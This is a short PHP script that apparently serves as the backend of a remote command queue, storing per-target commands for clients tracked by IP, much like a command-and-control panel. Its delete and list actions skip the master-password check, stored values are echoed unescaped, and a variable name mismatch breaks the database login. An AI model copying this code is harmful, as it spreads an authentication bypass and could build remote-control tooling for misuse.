<?php
//error_reporting(0);
require ('redbean.php');
require ('config.php');
global $masterPassword;
global $mysqlHost;
global $mysqlDbName;
global $mysqlUserName;
global $mysqlPassword;
R::setup('mysql:host=' . $mysqlHost . ';dbname=' . $mysqlDbName, $mysqlUsername, $mysqlPassword);
if (isset($_POST['password'])) {
    if (!isset($_POST['action'])) {
        die();
    }
    if ($_POST['action'] == 'delcmd') {
        if (isset($_POST['id'])) {
            if ($_POST['id'] == '*') {
                // delete all
                if (R::wipe('commands')) {
                    die('deleted all commands');
                } else {
                    die('could not delete all commands');
                }
            } else {
                // delete only by id
                $command = R::load('commands', $_POST['id']);
                if (empty($command)) {
                    die('could not find command by id ' . $_POST['id']);
                } else {
                    if (R::trash($command)) {
                        die('command deleted by id ' . $_POST['id']);
                    } else {
                        die('could not delete command by id ' . $_POST['id']);
                    }
                }
            }
        }
    }
    if ($_POST['action'] == 'listcmds') {
        // get commands ....
        //die('LOL');
        foreach (getCommands() as $command) {
            echo ('<id>' . $command->id . '</id>' . '<uniquename>' . $command->uniquename . '</uniquename>' . '<targetid>' . $command->targetid . '</targetid>' . '<name>' . $command->cmdname . '</name>' . '<args>' . $command->cmdargs . '</args><br>');
        }
        die();
    }
    if ($_POST['action'] == 'addcmd') {
        if ($_POST['password'] == $masterPassword) {
            if (isset($_POST['targetid']) && isset($_POST['name']) && isset($_POST['args'])) {
                if (addCommand($_POST['targetid'], $_POST['name'], $_POST['args'])) {
                    die('could not add command');
                } else {
                    die('command added');
                }
            }
        } else {
            die();
        }
    }
} else {
    die();
}
function getClientbyIp($ip) {
    $client = R::findOne('clients', 'ip = ?', [$ip]);
    return $client;
}
function commandExists($uniqueCmdName) {
    $command = R::findOne('commands', 'uniquename = :uniquename', ['uniquename' => $uniqueCmdName]);
    return !empty($command);
}
function addCommand($targetId, $cmdName, $cmdArgs) {
    $uniqueCmdName = sha1(random_bytes(8));
    if (!commandExists($uniqueCmdName)) {
        $command = R::dispense('commands');
        $command->uniquename = $uniqueCmdName;
        $command->targetid = $targetId;
        $command->cmdname = $cmdName;
        $command->cmdargs = $cmdArgs;
        $commandId = R::store($command);
        return empty($commandId);
    } else {
        die('command already exists');
    }
}
function getCommands($clientId = null) {
    $commands = R::findAll('commands', 'targetid IS NOT null');
    return $commands;
}
?>